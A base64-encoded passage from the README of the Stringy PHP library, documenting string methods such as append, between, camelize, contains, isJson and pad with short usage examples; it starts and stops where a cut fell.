cyBiZSBvZiB0eXBlIFN0cmluZ3ksCmludGVnZXIsIGJvb2xlYW4sIGV0Yy4K
CmBgYHBocAp1c2UgU3RyaW5neVxTdGF0aWNTdHJpbmd5IGFzIFM7CgovLyBU
cmFuc2xhdGVzIHRvIFN0cmluZ3k6OmNyZWF0ZSgnZsOyw7Riw6DFmScpLT5z
bGljZSgwLCAzKTsKLy8gUmV0dXJucyBhIFN0cmluZ3kgb2JqZWN0IHdpdGgg
dGhlIHN0cmluZyAiZsOyw7QiClM6OnNsaWNlKCdmw7LDtGLDoMWZJywgMCwg
Myk7CmBgYAoKIyMgQ2xhc3MgbWV0aG9kcwoKIyMjIyMgY3JlYXRlKG1peGVk
ICRzdHIgWywgJGVuY29kaW5nIF0pCgpDcmVhdGVzIGEgU3RyaW5neSBvYmpl
Y3QgYW5kIGFzc2lnbnMgYm90aCBzdHIgYW5kIGVuY29kaW5nIHByb3BlcnRp
ZXMKdGhlIHN1cHBsaWVkIHZhbHVlcy4gJHN0ciBpcyBjYXN0IHRvIGEgc3Ry
aW5nIHByaW9yIHRvIGFzc2lnbm1lbnQsIGFuZCBpZgokZW5jb2RpbmcgaXMg
bm90IHNwZWNpZmllZCwgaXQgZGVmYXVsdHMgdG8gbWJfaW50ZXJuYWxfZW5j
b2RpbmcoKS4gSXQKdGhlbiByZXR1cm5zIHRoZSBpbml0aWFsaXplZCBvYmpl
Y3QuIFRocm93cyBhbiBJbnZhbGlkQXJndW1lbnRFeGNlcHRpb24KaWYgdGhl
IGZpcnN0IGFyZ3VtZW50IGlzIGFuIGFycmF5IG9yIG9iamVjdCB3aXRob3V0
IGEgX190b1N0cmluZyBtZXRob2QuCgpgYGBwaHAKJHN0cmluZ3kgPSBTOjpj
cmVhdGUoJ2bDssO0YsOgxZknKTsgLy8gJ2bDssO0YsOgxZknCmBgYAoKIyMg
SW5zdGFuY2UgTWV0aG9kcwoKU3RyaW5neSBvYmplY3RzIGFyZSBpbW11dGFi
bGUuIEFsbCBleGFtcGxlcyBiZWxvdyBtYWtlIHVzZSBvZiBQSFAgNS42CmZ1
bmN0aW9uIGltcG9ydGluZywgYW5kIFBIUCA1LjQgc2hvcnQgYXJyYXkgc3lu
dGF4LiBUaGV5IGFsc28gYXNzdW1lIHRoZQplbmNvZGluZyByZXR1cm5lZCBi
eSBtYl9pbnRlcm5hbF9lbmNvZGluZygpIGlzIFVURi04LiBGb3IgZnVydGhl
ciBkZXRhaWxzLApzZWUgdGhlIGRvY3VtZW50YXRpb24gZm9yIHRoZSBjcmVh
dGUgbWV0aG9kIGFib3ZlLCBhcyB3ZWxsIGFzIHRoZSBub3RlcwpvbiBQSFAg
NS42IGNyZWF0aW9uLgoKIyMjIyMgYXBwZW5kKHN0cmluZyAkc3RyaW5nKQoK
UmV0dXJucyBhIG5ldyBzdHJpbmcgd2l0aCAkc3RyaW5nIGFwcGVuZGVkLgoK
YGBgcGhwCnMoJ2bDssO0JyktPmFwcGVuZCgnYsOgxZknKTsgLy8gJ2bDssO0
YsOgxZknCmBgYAoKIyMjIyMgYXQoaW50ICRpbmRleCkKClJldHVybnMgdGhl
IGNoYXJhY3RlciBhdCAkaW5kZXgsIHdpdGggaW5kZXhlcyBzdGFydGluZyBh
dCAwLgoKYGBgcGhwCnMoJ2bDssO0YsOgxZknKS0+YXQoMyk7IC8vICdiJwpg
YGAKCiMjIyMjIGJldHdlZW4oc3RyaW5nICRzdGFydCwgc3RyaW5nICRlbmQg
WywgaW50ICRvZmZzZXRdKQoKUmV0dXJucyB0aGUgc3Vic3RyaW5nIGJldHdl
ZW4gJHN0YXJ0IGFuZCAkZW5kLCBpZiBmb3VuZCwgb3IgYW4gZW1wdHkKc3Ry
aW5nLiBBbiBvcHRpb25hbCBvZmZzZXQgbWF5IGJlIHN1cHBsaWVkIGZyb20g
d2hpY2ggdG8gYmVnaW4gdGhlCnNlYXJjaCBmb3IgdGhlIHN0YXJ0IHN0cmlu
Zy4KCmBgYHBocApzKCd7Zm9vfSBhbmQge2Jhcn0nKS0+YmV0d2Vlbigneycs
ICd9Jyk7IC8vICdmb28nCmBgYAoKIyMjIyMgY2FtZWxpemUoKQoKUmV0dXJu
cyBhIGNhbWVsQ2FzZSB2ZXJzaW9uIG9mIHRoZSBzdHJpbmcuIFRyaW1zIHN1
cnJvdW5kaW5nIHNwYWNlcywKY2FwaXRhbGl6ZXMgbGV0dGVycyBmb2xsb3dp
bmcgZGlnaXRzLCBzcGFjZXMsIGRhc2hlcyBhbmQgdW5kZXJzY29yZXMsCmFu
ZCByZW1vdmVzIHNwYWNlcywgZGFzaGVzLCBhcyB3ZWxsIGFzIHVuZGVyc2Nv
cmVzLgoKYGBgcGhwCnMoJ0NhbWVsLUNhc2UnKS0+Y2FtZWxpemUoKTsgLy8g
J2NhbWVsQ2FzZScKYGBgCgojIyMjIyBjaGFycygpCgpSZXR1cm5zIGFuIGFy
cmF5IGNvbnNpc3Rpbmcgb2YgdGhlIGNoYXJhY3RlcnMgaW4gdGhlIHN0cmlu
Zy4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmNoYXJzKCk7IC8vIFsnZics
ICfDsicsICfDtCcsICdiJywgJ8OgJywgJ8WZJ10KYGBgCgojIyMjIyBjb2xs
YXBzZVdoaXRlc3BhY2UoKQoKVHJpbXMgdGhlIHN0cmluZyBhbmQgcmVwbGFj
ZXMgY29uc2VjdXRpdmUgd2hpdGVzcGFjZSBjaGFyYWN0ZXJzIHdpdGggYQpz
aW5nbGUgc3BhY2UuIFRoaXMgaW5jbHVkZXMgdGFicyBhbmQgbmV3bGluZSBj
aGFyYWN0ZXJzLCBhcyB3ZWxsIGFzCm11bHRpYnl0ZSB3aGl0ZXNwYWNlIHN1
Y2ggYXMgdGhlIHRoaW4gc3BhY2UgYW5kIGlkZW9ncmFwaGljIHNwYWNlLgoK
YGBgcGhwCnMoJyAgIM6fICAgICDPg8+FzrPOs8+BzrHPhs6tzrHPgiAgJykt
PmNvbGxhcHNlV2hpdGVzcGFjZSgpOyAvLyAnzp8gz4PPhc6zzrPPgc6xz4bO
rc6xz4InCmBgYAoKIyMjIyMgY29udGFpbnMoc3RyaW5nICRuZWVkbGUgWywg
Ym9vbGVhbiAkY2FzZVNlbnNpdGl2ZSA9IHRydWUgXSkKClJldHVybnMgdHJ1
ZSBpZiB0aGUgc3RyaW5nIGNvbnRhaW5zICRuZWVkbGUsIGZhbHNlIG90aGVy
d2lzZS4gQnkgZGVmYXVsdCwKdGhlIGNvbXBhcmlzb24gaXMgY2FzZS1zZW5z
aXRpdmUsIGJ1dCBjYW4gYmUgbWFkZSBpbnNlbnNpdGl2ZQpieSBzZXR0aW5n
ICRjYXNlU2Vuc2l0aXZlIHRvIGZhbHNlLgoKYGBgcGhwCnMoJ86fIM+Dz4XO
s86zz4HOsc+Gzq3Osc+CIM61zq/PgM61JyktPmNvbnRhaW5zKCfPg8+FzrPO
s8+BzrHPhs6tzrHPgicpOyAvLyB0cnVlCmBgYAoKIyMjIyMgY29udGFpbnNB
bGwoYXJyYXkgJG5lZWRsZXMgWywgYm9vbGVhbiAkY2FzZVNlbnNpdGl2ZSA9
IHRydWUgXSkKClJldHVybnMgdHJ1ZSBpZiB0aGUgc3RyaW5nIGNvbnRhaW5z
IGFsbCAkbmVlZGxlcywgZmFsc2Ugb3RoZXJ3aXNlLiBCeQpkZWZhdWx0IHRo
ZSBjb21wYXJpc29uIGlzIGNhc2Utc2Vuc2l0aXZlLCBidXQgY2FuIGJlIG1h
ZGUgaW5zZW5zaXRpdmUgYnkKc2V0dGluZyAkY2FzZVNlbnNpdGl2ZSB0byBm
YWxzZS4KCmBgYHBocApzKCdmb28gJiBiYXInKS0+Y29udGFpbnNBbGwoWydm
b28nLCAnYmFyJ10pOyAvLyB0cnVlCmBgYAoKIyMjIyMgY29udGFpbnNBbnko
YXJyYXkgJG5lZWRsZXMgWywgYm9vbGVhbiAkY2FzZVNlbnNpdGl2ZSA9IHRy
dWUgXSkKClJldHVybnMgdHJ1ZSBpZiB0aGUgc3RyaW5nIGNvbnRhaW5zIGFu
eSAkbmVlZGxlcywgZmFsc2Ugb3RoZXJ3aXNlLiBCeQpkZWZhdWx0IHRoZSBj
b21wYXJpc29uIGlzIGNhc2Utc2Vuc2l0aXZlLCBidXQgY2FuIGJlIG1hZGUg
aW5zZW5zaXRpdmUgYnkKc2V0dGluZyAkY2FzZVNlbnNpdGl2ZSB0byBmYWxz
ZS4KCmBgYHBocApzKCdzdHIgY29udGFpbnMgZm9vJyktPmNvbnRhaW5zQW55
KFsnZm9vJywgJ2JhciddKTsgLy8gdHJ1ZQpgYGAKCiMjIyMjIGNvdW50U3Vi
c3RyKHN0cmluZyAkc3Vic3RyaW5nIFssIGJvb2xlYW4gJGNhc2VTZW5zaXRp
dmUgPSB0cnVlIF0pCgpSZXR1cm5zIHRoZSBudW1iZXIgb2Ygb2NjdXJyZW5j
ZXMgb2YgJHN1YnN0cmluZyBpbiB0aGUgZ2l2ZW4gc3RyaW5nLgpCeSBkZWZh
dWx0LCB0aGUgY29tcGFyaXNvbiBpcyBjYXNlLXNlbnNpdGl2ZSwgYnV0IGNh
biBiZSBtYWRlIGluc2Vuc2l0aXZlCmJ5IHNldHRpbmcgJGNhc2VTZW5zaXRp
dmUgdG8gZmFsc2UuCgpgYGBwaHAKcygnzp8gz4PPhc6zzrPPgc6xz4bOrc6x
z4IgzrXOr8+AzrUnKS0+Y291bnRTdWJzdHIoJ86xJyk7IC8vIDIKYGBgCgoj
IyMjIyBkYXNoZXJpemUoKQoKUmV0dXJucyBhIGxvd2VyY2FzZSBhbmQgdHJp
bW1lZCBzdHJpbmcgc2VwYXJhdGVkIGJ5IGRhc2hlcy4gRGFzaGVzIGFyZQpp
bnNlcnRlZCBiZWZvcmUgdXBwZXJjYXNlIGNoYXJhY3RlcnMgKHdpdGggdGhl
IGV4Y2VwdGlvbiBvZiB0aGUgZmlyc3QKY2hhcmFjdGVyIG9mIHRoZSBzdHJp
bmcpLCBhbmQgaW4gcGxhY2Ugb2Ygc3BhY2VzIGFzIHdlbGwgYXMgdW5kZXJz
Y29yZXMuCgpgYGBwaHAKcygnZm9vQmFyJyktPmRhc2hlcml6ZSgpOyAvLyAn
Zm9vLWJhcicKYGBgCgojIyMjIyBkZWxpbWl0KGludCAkZGVsaW1pdGVyKQoK
UmV0dXJucyBhIGxvd2VyY2FzZSBhbmQgdHJpbW1lZCBzdHJpbmcgc2VwYXJh
dGVkIGJ5IHRoZSBnaXZlbiBkZWxpbWl0ZXIuCkRlbGltaXRlcnMgYXJlIGlu
c2VydGVkIGJlZm9yZSB1cHBlcmNhc2UgY2hhcmFjdGVycyAod2l0aCB0aGUg
ZXhjZXB0aW9uCm9mIHRoZSBmaXJzdCBjaGFyYWN0ZXIgb2YgdGhlIHN0cmlu
ZyksIGFuZCBpbiBwbGFjZSBvZiBzcGFjZXMsIGRhc2hlcywKYW5kIHVuZGVy
c2NvcmVzLiBBbHBoYSBkZWxpbWl0ZXJzIGFyZSBub3QgY29udmVydGVkIHRv
IGxvd2VyY2FzZS4KCmBgYHBocApzKCdmb29CYXInKS0+ZGVsaW1pdCgnOjon
KTsgLy8gJ2Zvbzo6YmFyJwpgYGAKCiMjIyMjIGVuZHNXaXRoKHN0cmluZyAk
c3Vic3RyaW5nIFssIGJvb2xlYW4gJGNhc2VTZW5zaXRpdmUgPSB0cnVlIF0p
CgpSZXR1cm5zIHRydWUgaWYgdGhlIHN0cmluZyBlbmRzIHdpdGggJHN1YnN0
cmluZywgZmFsc2Ugb3RoZXJ3aXNlLiBCeQpkZWZhdWx0LCB0aGUgY29tcGFy
aXNvbiBpcyBjYXNlLXNlbnNpdGl2ZSwgYnV0IGNhbiBiZSBtYWRlIGluc2Vu
c2l0aXZlIGJ5CnNldHRpbmcgJGNhc2VTZW5zaXRpdmUgdG8gZmFsc2UuCgpg
YGBwaHAKcygnZsOyw7Riw6DFmScpLT5lbmRzV2l0aCgnYsOgxZknKTsgLy8g
dHJ1ZQpgYGAKCiMjIyMjIGVuZHNXaXRoQW55KHN0cmluZ1tdICRzdWJzdHJp
bmdzIFssIGJvb2xlYW4gJGNhc2VTZW5zaXRpdmUgPSB0cnVlIF0pCgpSZXR1
cm5zIHRydWUgaWYgdGhlIHN0cmluZyBlbmRzIHdpdGggYW55IG9mICRzdWJz
dHJpbmdzLCBmYWxzZSBvdGhlcndpc2UuCkJ5IGRlZmF1bHQsIHRoZSBjb21w
YXJpc29uIGlzIGNhc2Utc2Vuc2l0aXZlLCBidXQgY2FuIGJlIG1hZGUgaW5z
ZW5zaXRpdmUKYnkgc2V0dGluZyAkY2FzZVNlbnNpdGl2ZSB0byBmYWxzZS4K
CmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmVuZHNXaXRoQW55KFsnYsOgxZkn
LCAnYmF6J10pOyAvLyB0cnVlCmBgYAoKIyMjIyMgZW5zdXJlTGVmdChzdHJp
bmcgJHN1YnN0cmluZykKCkVuc3VyZXMgdGhhdCB0aGUgc3RyaW5nIGJlZ2lu
cyB3aXRoICRzdWJzdHJpbmcuIElmIGl0IGRvZXNuJ3QsIGl0J3MgcHJlcGVu
ZGVkLgoKYGBgcGhwCnMoJ2Zvb2JhcicpLT5lbnN1cmVMZWZ0KCdodHRwOi8v
Jyk7IC8vICdodHRwOi8vZm9vYmFyJwpgYGAKCiMjIyMjIGVuc3VyZVJpZ2h0
KHN0cmluZyAkc3Vic3RyaW5nKQoKRW5zdXJlcyB0aGF0IHRoZSBzdHJpbmcg
ZW5kcyB3aXRoICRzdWJzdHJpbmcuIElmIGl0IGRvZXNuJ3QsIGl0J3MgYXBw
ZW5kZWQuCgpgYGBwaHAKcygnZm9vYmFyJyktPmVuc3VyZVJpZ2h0KCcuY29t
Jyk7IC8vICdmb29iYXIuY29tJwpgYGAKCiMjIyMjIGZpcnN0KGludCAkbikK
ClJldHVybnMgdGhlIGZpcnN0ICRuIGNoYXJhY3RlcnMgb2YgdGhlIHN0cmlu
Zy4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmZpcnN0KDMpOyAvLyAnZsOy
w7QnCmBgYAoKIyMjIyMgZ2V0RW5jb2RpbmcoKQoKUmV0dXJucyB0aGUgZW5j
b2RpbmcgdXNlZCBieSB0aGUgU3RyaW5neSBvYmplY3QuCgpgYGBwaHAKcygn
ZsOyw7Riw6DFmScpLT5nZXRFbmNvZGluZygpOyAvLyAnVVRGLTgnCmBgYAoK
IyMjIyMgaGFzTG93ZXJDYXNlKCkKClJldHVybnMgdHJ1ZSBpZiB0aGUgc3Ry
aW5nIGNvbnRhaW5zIGEgbG93ZXIgY2FzZSBjaGFyLCBmYWxzZSBvdGhlcndp
c2UuCgpgYGBwaHAKcygnZsOyw7Riw6DFmScpLT5oYXNMb3dlckNhc2UoKTsg
Ly8gdHJ1ZQpgYGAKCiMjIyMjIGhhc1VwcGVyQ2FzZSgpCgpSZXR1cm5zIHRy
dWUgaWYgdGhlIHN0cmluZyBjb250YWlucyBhbiB1cHBlciBjYXNlIGNoYXIs
IGZhbHNlIG90aGVyd2lzZS4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmhh
c1VwcGVyQ2FzZSgpOyAvLyBmYWxzZQpgYGAKCiMjIyMjIGh0bWxEZWNvZGUo
KQoKQ29udmVydCBhbGwgSFRNTCBlbnRpdGllcyB0byB0aGVpciBhcHBsaWNh
YmxlIGNoYXJhY3RlcnMuIEFuIGFsaWFzIG9mCmh0bWxfZW50aXR5X2RlY29k
ZS4gRm9yIGEgbGlzdCBvZiBmbGFncywgcmVmZXIgdG8KaHR0cDovL3BocC5u
ZXQvbWFudWFsL2VuL2Z1bmN0aW9uLmh0bWwtZW50aXR5LWRlY29kZS5waHAK
CmBgYHBocApzKCcmYW1wOycpLT5odG1sRGVjb2RlKCk7IC8vICcmJwpgYGAK
CiMjIyMjIGh0bWxFbmNvZGUoKQoKQ29udmVydCBhbGwgYXBwbGljYWJsZSBj
aGFyYWN0ZXJzIHRvIEhUTUwgZW50aXRpZXMuIEFuIGFsaWFzIG9mCmh0bWxl
bnRpdGllcy4gUmVmZXIgdG8gaHR0cDovL3BocC5uZXQvbWFudWFsL2VuL2Z1
bmN0aW9uLmh0bWxlbnRpdGllcy5waHAKZm9yIGEgbGlzdCBvZiBmbGFncy4K
CmBgYHBocApzKCcmJyktPmh0bWxFbmNvZGUoKTsgLy8gJyZhbXA7JwpgYGAK
CiMjIyMjIGh1bWFuaXplKCkKCkNhcGl0YWxpemVzIHRoZSBmaXJzdCB3b3Jk
IG9mIHRoZSBzdHJpbmcsIHJlcGxhY2VzIHVuZGVyc2NvcmVzIHdpdGgKc3Bh
Y2VzLCBhbmQgc3RyaXBzICdfaWQnLgoKYGBgcGhwCnMoJ2F1dGhvcl9pZCcp
LT5odW1hbml6ZSgpOyAvLyAnQXV0aG9yJwpgYGAKCiMjIyMjIGluZGV4T2Yo
c3RyaW5nICRuZWVkbGUgWywgJG9mZnNldCA9IDAgXSk7CgpSZXR1cm5zIHRo
ZSBpbmRleCBvZiB0aGUgZmlyc3Qgb2NjdXJyZW5jZSBvZiAkbmVlZGxlIGlu
IHRoZSBzdHJpbmcsCmFuZCBmYWxzZSBpZiBub3QgZm91bmQuIEFjY2VwdHMg
YW4gb3B0aW9uYWwgb2Zmc2V0IGZyb20gd2hpY2ggdG8gYmVnaW4KdGhlIHNl
YXJjaC4gQSBuZWdhdGl2ZSBpbmRleCBzZWFyY2hlcyBmcm9tIHRoZSBlbmQK
CmBgYHBocApzKCdzdHJpbmcnKS0+aW5kZXhPZignaW5nJyk7IC8vIDMKYGBg
CgojIyMjIyBpbmRleE9mTGFzdChzdHJpbmcgJG5lZWRsZSBbLCAkb2Zmc2V0
ID0gMCBdKTsKClJldHVybnMgdGhlIGluZGV4IG9mIHRoZSBsYXN0IG9jY3Vy
cmVuY2Ugb2YgJG5lZWRsZSBpbiB0aGUgc3RyaW5nLAphbmQgZmFsc2UgaWYg
bm90IGZvdW5kLiBBY2NlcHRzIGFuIG9wdGlvbmFsIG9mZnNldCBmcm9tIHdo
aWNoIHRvIGJlZ2luCnRoZSBzZWFyY2guIE9mZnNldHMgbWF5IGJlIG5lZ2F0
aXZlIHRvIGNvdW50IGZyb20gdGhlIGxhc3QgY2hhcmFjdGVyCmluIHRoZSBz
dHJpbmcuCgpgYGBwaHAKcygnZm9vYmFyZm9vJyktPmluZGV4T2ZMYXN0KCdm
b28nKTsgLy8gMTAKYGBgCgojIyMjIyBpbnNlcnQoaW50ICRpbmRleCwgc3Ry
aW5nICRzdWJzdHJpbmcpCgpJbnNlcnRzICRzdWJzdHJpbmcgaW50byB0aGUg
c3RyaW5nIGF0IHRoZSAkaW5kZXggcHJvdmlkZWQuCgpgYGBwaHAKcygnZsOy
w7RixZknKS0+aW5zZXJ0KCfDoCcsIDQpOyAvLyAnZsOyw7Riw6DFmScKYGBg
CgojIyMjIyBpc0FscGhhKCkKClJldHVybnMgdHJ1ZSBpZiB0aGUgc3RyaW5n
IGNvbnRhaW5zIG9ubHkgYWxwaGFiZXRpYyBjaGFycywgZmFsc2Ugb3RoZXJ3
aXNlLgoKYGBgcGhwCnMoJ+S4ueWwvOeIvicpLT5pc0FscGhhKCk7IC8vIHRy
dWUKYGBgCgojIyMjIyBpc0FscGhhbnVtZXJpYygpCgpSZXR1cm5zIHRydWUg
aWYgdGhlIHN0cmluZyBjb250YWlucyBvbmx5IGFscGhhYmV0aWMgYW5kIG51
bWVyaWMgY2hhcnMsIGZhbHNlCm90aGVyd2lzZS4KCmBgYHBocApzKCfYr9in
2YbZitin2YQxJyktPmlzQWxwaGFudW1lcmljKCk7IC8vIHRydWUKYGBgCgoj
IyMjIyBpc0Jhc2U2NCgpCgpSZXR1cm5zIHRydWUgaWYgdGhlIHN0cmluZyBp
cyBiYXNlNjQgZW5jb2RlZCwgZmFsc2Ugb3RoZXJ3aXNlLgoKYGBgcGhwCnMo
J1ptOXZZbUZ5JyktPmlzQmFzZTY0KCk7IC8vIHRydWUKYGBgCgojIyMjIyBp
c0JsYW5rKCkKClJldHVybnMgdHJ1ZSBpZiB0aGUgc3RyaW5nIGNvbnRhaW5z
IG9ubHkgd2hpdGVzcGFjZSBjaGFycywgZmFsc2Ugb3RoZXJ3aXNlLgoKYGBg
cGhwCnMoIlxuXHQgIFx2XGYiKS0+aXNCbGFuaygpOyAvLyB0cnVlCmBgYAoK
IyMjIyMgaXNIZXhhZGVjaW1hbCgpCgpSZXR1cm5zIHRydWUgaWYgdGhlIHN0
cmluZyBjb250YWlucyBvbmx5IGhleGFkZWNpbWFsIGNoYXJzLCBmYWxzZSBv
dGhlcndpc2UuCgpgYGBwaHAKcygnQTEwMkYnKS0+aXNIZXhhZGVjaW1hbCgp
OyAvLyB0cnVlCmBgYAoKIyMjIyMgaXNKc29uKCkKClJldHVybnMgdHJ1ZSBp
ZiB0aGUgc3RyaW5nIGlzIEpTT04sIGZhbHNlIG90aGVyd2lzZS4gVW5saWtl
IGpzb25fZGVjb2RlCmluIFBIUCA1LngsIHRoaXMgbWV0aG9kIGlzIGNvbnNp
c3RlbnQgd2l0aCBQSFAgNyBhbmQgb3RoZXIgSlNPTiBwYXJzZXJzLAppbiB0
aGF0IGFuIGVtcHR5IHN0cmluZyBpcyBub3QgY29uc2lkZXJlZCB2YWxpZCBK
U09OLgoKYGBgcGhwCnMoJ3siZm9vIjoiYmFyIn0nKS0+aXNKc29uKCk7IC8v
IHRydWUKYGBgCgojIyMjIyBpc0xvd2VyQ2FzZSgpCgpSZXR1cm5zIHRydWUg
aWYgdGhlIHN0cmluZyBjb250YWlucyBvbmx5IGxvd2VyIGNhc2UgY2hhcnMs
IGZhbHNlIG90aGVyd2lzZS4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmlz
TG93ZXJDYXNlKCk7IC8vIHRydWUKYGBgCgojIyMjIyBpc1NlcmlhbGl6ZWQo
KQoKUmV0dXJucyB0cnVlIGlmIHRoZSBzdHJpbmcgaXMgc2VyaWFsaXplZCwg
ZmFsc2Ugb3RoZXJ3aXNlLgoKYGBgcGhwCnMoJ2E6MTp7czozOiJmb28iO3M6
MzoiYmFyIjt9JyktPmlzU2VyaWFsaXplZCgpOyAvLyB0cnVlCmBgYAoKIyMj
IyMgaXNVcHBlckNhc2UoKQoKUmV0dXJucyB0cnVlIGlmIHRoZSBzdHJpbmcg
Y29udGFpbnMgb25seSB1cHBlciBjYXNlIGNoYXJzLCBmYWxzZSBvdGhlcndp
c2UuCgpgYGBwaHAKcygnRsOSw5RCw4DFmCcpLT5pc1VwcGVyQ2FzZSgpOyAv
LyB0cnVlCmBgYAoKIyMjIyMgbGFzdChpbnQgJG4pCgpSZXR1cm5zIHRoZSBs
YXN0ICRuIGNoYXJhY3RlcnMgb2YgdGhlIHN0cmluZy4KCmBgYHBocApzKCdm
w7LDtGLDoMWZJyktPmxhc3QoMyk7IC8vICdiw6DFmScKYGBgCgojIyMjIyBs
ZW5ndGgoKQoKUmV0dXJucyB0aGUgbGVuZ3RoIG9mIHRoZSBzdHJpbmcuIEFu
IGFsaWFzIGZvciBQSFAncyBtYl9zdHJsZW4oKSBmdW5jdGlvbi4KCmBgYHBo
cApzKCdmw7LDtGLDoMWZJyktPmxlbmd0aCgpOyAvLyA2CmBgYAoKIyMjIyMg
bGluZXMoKQoKU3BsaXRzIG9uIG5ld2xpbmVzIGFuZCBjYXJyaWFnZSByZXR1
cm5zLCByZXR1cm5pbmcgYW4gYXJyYXkgb2YgU3RyaW5neQpvYmplY3RzIGNv
cnJlc3BvbmRpbmcgdG8gdGhlIGxpbmVzIGluIHRoZSBzdHJpbmcuCgpgYGBw
aHAKcygiZsOyw7RcclxuYsOgxZlcbiIpLT5saW5lcygpOyAvLyBbJ2bDssO0
JywgJ2LDoMWZJywgJyddCmBgYAoKIyMjIyMgbG9uZ2VzdENvbW1vblByZWZp
eChzdHJpbmcgJG90aGVyU3RyKQoKUmV0dXJucyB0aGUgbG9uZ2VzdCBjb21t
b24gcHJlZml4IGJldHdlZW4gdGhlIHN0cmluZyBhbmQgJG90aGVyU3RyLgoK
YGBgcGhwCnMoJ2Zvb2JhcicpLT5sb25nZXN0Q29tbW9uUHJlZml4KCdmb29i
YXonKTsgLy8gJ2Zvb2JhJwpgYGAKCiMjIyMjIGxvbmdlc3RDb21tb25TdWZm
aXgoc3RyaW5nICRvdGhlclN0cikKClJldHVybnMgdGhlIGxvbmdlc3QgY29t
bW9uIHN1ZmZpeCBiZXR3ZWVuIHRoZSBzdHJpbmcgYW5kICRvdGhlclN0ci4K
CmBgYHBocApzKCdmw7LDtGLDoMWZJyktPmxvbmdlc3RDb21tb25TdWZmaXgo
J2bDsnJiw6DFmScpOyAvLyAnYsOgxZknCmBgYAoKIyMjIyMgbG9uZ2VzdENv
bW1vblN1YnN0cmluZyhzdHJpbmcgJG90aGVyU3RyKQoKUmV0dXJucyB0aGUg
bG9uZ2VzdCBjb21tb24gc3Vic3RyaW5nIGJldHdlZW4gdGhlIHN0cmluZyBh
bmQgJG90aGVyU3RyLiBJbiB0aGUKY2FzZSBvZiB0aWVzLCBpdCByZXR1cm5z
IHRoYXQgd2hpY2ggb2NjdXJzIGZpcnN0LgoKYGBgcGhwCnMoJ2Zvb2Jhcicp
LT5sb25nZXN0Q29tbW9uU3Vic3RyaW5nKCdib29mYXInKTsgLy8gJ29vJwpg
YGAKCiMjIyMjIGxvd2VyQ2FzZUZpcnN0KCkKCkNvbnZlcnRzIHRoZSBmaXJz
dCBjaGFyYWN0ZXIgb2YgdGhlIHN1cHBsaWVkIHN0cmluZyB0byBsb3dlciBj
YXNlLgoKYGBgcGhwCnMoJ86jIGZvbycpLT5sb3dlckNhc2VGaXJzdCgpOyAv
LyAnz4MgZm9vJwpgYGAKCiMjIyMjIHBhZChpbnQgJGxlbmd0aCBbLCBzdHJp
bmcgJHBhZFN0ciA9ICcgJyBbLCBzdHJpbmcgJHBhZFR5cGUgPSAncmlnaHQn
IF1dKQoKUGFkcyB0aGUgc3RyaW5nIHRvIGEgZ2l2ZW4gbGVuZ3RoIHdpdGgg
JHBhZFN0ci4gSWYgbGVuZ3RoIGlzIGxlc3MgdGhhbgpvciBlcXVhbCB0byB0
aGUgbGVuZ3RoIG9mIHRoZSBzdHJpbmcsIG5vIHBhZGRpbmcgdGFrZXMgcGxh
Y2VzLiBUaGUgZGVmYXVsdApzdHJpbmcgdXNlZCBmb3IgcGFkZGluZyBpcyBh
IHNwYWNlLCBhbmQgdGhlIGRlZmF1bHQgdHlwZSAob25lIG9mICdsZWZ0JywK
J3JpZ2h0JywgJ2JvdGgnKSBpcyAncmlnaHQnLiBUaHJvd3MgYW4gSW52YWxp
ZEFyZ3VtZW50RXhjZXB0aW9uIGlmCiRwYWRUeXBlIGlzbid0IG9uZSBvZiB0
aG9zZSAzIHZhbHVlcy4KCmBgYHBocApzKCdmw7LDtGLDoMWZJyktPnBhZCg5
LCAnLS8nLCAnbGVmdCcpOyAvLyAnLS8tZsOyw7Riw6DFmScKYGBgCgojIyMj
IyBwYWRCb3RoKGludCAkbGVuZ3RoIFssIHN0cmluZyAkcGFkU3RyID0gJyAn
IF0pCgpSZXR1cm5zIGEgbmV3IHN0cmluZyBvZiBhIGdpdmVuIGxlbmd0aCBz
dWNoIHRoYXQgYm90aCBzaWRlcyBvZiB0aGUgc3RyaW5nCnN0cmluZyBhcmUg
cGFkZGVkLiBBbGlhcyBmb3IgcGFkKCkgd2l0aCBhICRwYWRUeXBlIG9mICdi
b3RoJy4KCmBgYHBocApzKCdmb28gYmFyJyktPnBhZEJvdGgoOSwgJyAnKTsg
Ly8gJyBmb28gYmFyICcKYGBgCgojIyMjIyBwYWRMZWZ0KGludCAkbGVuZ3Ro
IFssIHN0cmluZyAkcGFkU3RyID0gJyAnIF0pCgpSZXR1cm5zIGEgbmV3IHN0
cmluZyBvZiBhIGdpdmVuIGxlbmd0aCBzdWNoIHRoYXQgdGhlIGJlZ2lubmlu
ZyBvZiB0aGUKc3RyaW5nIGlzIHBhZGRlZC4gQWxpYXMgZm9yIHBhZCgpIHdp
dGggYSAkcGFkVHlwZSBvZiAnbGVmdCcuCgpgYGBwaHAKcygnZm9vIGJhcicp
LT5wYWRMZWZ0KDksICcgJyk7IC8vICcgIGZvbyBiYXInCmBgYAoKIyMjIyMg
cGFkUmlnaHQoaW50ICRsZW5ndGggWywgc3RyaW5nICRwYWRTdHIgPSAnICcg
XSkKClJldHVybnMgYSBuZXcgc3RyaW5nIG9mIGEgZ2l2ZW4gbGVuZ3RoIHN1
Y2ggdGhhdCB0aGUgZW5kIG9mIHRoZSBzdHJpbmcgaXMKcGFkZGVkLiBBbGlh
cyBmb3IgcGFkKCkgd2l0aCBhICRwYWRUeXBlIG9mICdyaWdodCcuCgpgYGBw
aHAKcygnZm9vIGJhcicpLT5wYWRSaWdodCgxMCwgJ18qJyk7IC8vICdmb28g
YmFyXypfJwpgYGAKCiMjIyMjIHByZXBlbmQoc3RyaW5nICRzdHJpbmcpCgpS
ZXR1cm5zIGEgbmV3IHN0cmluZyBzdGFydGluZyB3aXRoICRzdHJpbmcuCgpg
YGBwaHAKcygnYsOgxZknKS0+cHJlcGVuZCgnZsOyw7QnKTsgLy8gJ2bDssO0
YsOgxZknCmBgYAoKIyMjIyMgcmVnZXhSZXBsYWNlKHN0cmluZyAkcGF0dGVy
biwgc3RyaW5nICRyZXBsYWNlbWVudCBbLCBzdHJpbmcgJG9wdGlvbnMgPSAn
